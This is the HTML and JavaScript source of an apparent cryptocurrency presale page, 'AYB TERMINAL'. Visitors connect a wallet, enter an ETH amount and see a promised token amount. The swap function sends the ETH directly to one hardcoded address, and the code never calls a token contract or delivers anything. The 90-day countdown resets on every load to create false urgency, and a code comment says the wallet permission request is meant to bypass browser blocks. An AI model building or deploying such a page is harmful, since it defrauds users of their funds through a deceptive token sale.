<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AYB TERMINAL</title>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
    
    <style>
        :root { --primary: #00ffa3; --bg: #0a0c10; --card: #161b22; --modal: #1c2128; }
        body { background: var(--bg); color: white; font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; }
        
        /* Mobile Optimization */
        .card { background: var(--card); border: 1px solid #30363d; padding: 2rem; border-radius: 25px; width: 90%; max-width: 380px; text-align: center; border-top: 4px solid var(--primary); box-shadow: 0 25px 50px rgba(0,0,0,0.6); }
        h1 { font-family: 'Orbitron', sans-serif; color: var(--primary); font-size: 1.4rem; letter-spacing: 2px; }

        .timer-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 6px; margin: 20px 0; }
        .timer-box { background: #010409; border: 1px solid #30363d; padding: 8px 2px; border-radius: 10px; }
        .timer-val { display: block; font-family: 'Orbitron'; color: var(--primary); font-size: 1rem; }
        .timer-label { font-size: 0.45rem; color: #8b949e; text-transform: uppercase; }

        .btn { background: var(--primary); color: #000; border: none; padding: 16px; border-radius: 12px; width: 100%; font-weight: 800; cursor: pointer; text-transform: uppercase; font-size: 0.85rem; transition: 0.2s; }
        .btn:disabled { background: #21262d; color: #484f58; cursor: not-allowed; }

        /* Wallet Modal Icons Fixed */
        #modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.9); display: none; justify-content: center; align-items: center; z-index: 1000; backdrop-filter: blur(8px); }
        .modal-content { background: var(--modal); border: 1px solid #30363d; border-radius: 20px; width: 90%; max-width: 340px; padding: 20px; }
        
        .wallet-row { display: flex; align-items: center; padding: 12px; border-radius: 12px; border: 1px solid #30363d; margin-top: 10px; cursor: pointer; background: #21262d; }
        .wallet-row svg { width: 28px; height: 28px; margin-right: 12px; }
        .wallet-row span { font-weight: 600; font-size: 0.9rem; }

        .buy-interface { display: none; background: #010409; padding: 18px; border-radius: 15px; text-align: left; margin-top: 15px; border-left: 3px solid var(--primary); }
        input { background: transparent; border: none; color: white; font-size: 1.3rem; width: 100%; outline: none; font-weight: bold; margin-top: 5px; }
        .status-msg { font-size: 0.6rem; margin-top: 10px; display: block; font-weight: 600; }
    </style>
</head>
<body>

<div class="card">
    <h1>AYB TERMINAL</h1>
    <div class="timer-grid">
        <div class="timer-box"><span class="timer-val" id="d">90</span><span class="timer-label">Days</span></div>
        <div class="timer-box"><span class="timer-val" id="h">00</span><span class="timer-label">Hrs</span></div>
        <div class="timer-box"><span class="timer-val" id="m">00</span><span class="timer-label">Min</span></div>
        <div class="timer-box"><span class="timer-val" id="s">00</span><span class="timer-label">Sec</span></div>
    </div>

    <div id="auth-box">
        <button id="connect-trigger" class="btn">Connect Wallet</button>
    </div>

    <div id="swap-box" class="buy-interface">
        <label style="font-size: 0.6rem; color: #8b949e;">PAY (ETH)</label>
        <input type="number" id="eth-input" placeholder="0.0" oninput="updateCalculation()">
        
        <label style="font-size: 0.6rem; color: #8b949e; margin-top: 12px; display: block;">RECEIVE (AYB)</label>
        <span id="ayb-output" style="color: var(--primary); font-family: 'Orbitron'; font-size: 1.2rem; display: block; margin-top: 5px;">0.00</span>
        
        <span id="buy-status" class="status-msg" style="color: #4fd1c5;">Network: Arbitrum</span>
        <button id="buy-btn" class="btn" style="margin-top: 15px;" onclick="executeSwap()" disabled>Execute Transaction</button>
    </div>
</div>

<div id="modal-overlay">
    <div class="modal-content">
        <div style="display:flex; justify-content:space-between; margin-bottom:15px;">
            <span style="font-size:0.8rem; color:#8b949e">Select Provider</span>
            <span id="close-x" style="cursor:pointer">&times;</span>
        </div>
        
        <div class="wallet-row" onclick="forceConnect()">
            <svg viewBox="0 0 32 32"><path fill="#E17726" d="M30.3 5.5l-3.3-4.1-1.2 4.1z"/><path fill="#E2761B" d="M1.7 5.5l3.3-4.1 1.2 4.1z"/><path fill="#E4761B" d="M26.4 13.7l-4.5-8.4-5.9.1-5.9-.1-4.5 8.4z"/></svg>
            <span>MetaMask</span>
        </div>
        <div class="wallet-row" onclick="forceConnect()">
            <svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#3375BB"/><path fill="#FFF" d="M16 8l-8 4v8l8 4 8-4v-8z"/></svg>
            <span>Trust Wallet</span>
        </div>
    </div>
</div>

<script>
    let ethPrice = 3500;
    const buyBtn = document.getElementById('buy-btn');

    // Fetch Live Price
    fetch('https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT')
        .then(r => r.json()).then(d => ethPrice = parseFloat(d.price));

    function updateCalculation() {
        const eth = document.getElementById('eth-input').value;
        const output = document.getElementById('ayb-output');
        if(eth > 0) {
            output.innerText = Math.floor((eth * ethPrice) / 0.1).toLocaleString();
            buyBtn.disabled = false;
        } else {
            output.innerText = "0.00";
            buyBtn.disabled = true;
        }
    }

    document.getElementById('connect-trigger').onclick = () => document.getElementById('modal-overlay').style.display = 'flex';
    document.getElementById('close-x').onclick = () => document.getElementById('modal-overlay').style.display = 'none';

    async function forceConnect() {
        if (window.ethereum) {
            try {
                // Request permissions specifically to bypass browser blocks
                await window.ethereum.request({ method: "wallet_requestPermissions", params: [{ eth_accounts: {} }] });
                document.getElementById('modal-overlay').style.display = 'none';
                document.getElementById('auth-box').style.display = 'none';
                document.getElementById('swap-box').style.display = 'block';
            } catch (e) {}
        } else {
            // Mobile redirect to MetaMask DApp browser
            window.location.href = `https://metamask.app.link/dapp/${window.location.href.replace(/https?:\/\//, '')}`;
        }
    }

    async function executeSwap() {
        const val = document.getElementById('eth-input').value;
        const status = document.getElementById('buy-status');
        try {
            const provider = new ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();
            const tx = await signer.sendTransaction({
                to: "0x066bbf27694982662cEAb0072793132B03027F47",
                value: ethers.parseEther(val)
            });
            status.innerText = "TX Sent: " + tx.hash.substring(0,12) + "...";
            status.style.color = "#00ffa3";
        } catch (e) {
            status.innerText = "Error: Please check balance on Arbitrum";
            status.style.color = "#ff4a4a";
        }
    }

    // Timer
    const end = new Date(); end.setDate(end.getDate() + 90);
    setInterval(() => {
        const d = end - new Date();
        document.getElementById('d').innerText = Math.floor(d / 864e5);
        document.getElementById('h').innerText = Math.floor((d % 864e5) / 36e5);
        document.getElementById('m').innerText = Math.floor((d % 36e5) / 6e4);
        document.getElementById('s').innerText = Math.floor((d % 6e4) / 1000);
    }, 1000);
</script>
</body>
</html>
